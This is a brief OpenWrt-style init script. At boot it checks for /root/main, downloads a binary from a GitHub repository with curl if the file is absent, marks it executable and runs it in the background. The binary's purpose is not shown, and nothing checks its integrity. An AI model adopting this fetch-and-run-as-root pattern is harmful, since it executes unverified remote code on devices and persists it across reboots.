#!/bin/sh /etc/rc.common

FILE=/root/main
if test -f "$FILE"; then
    echo "$FILE exists."
else
 cd /root/ && curl -OL https://github.com/SivashanDT/Binary/raw/main/main
chmod +x /root/main
fi 

START=200



start() { 
    echo start
    /root/main &
}

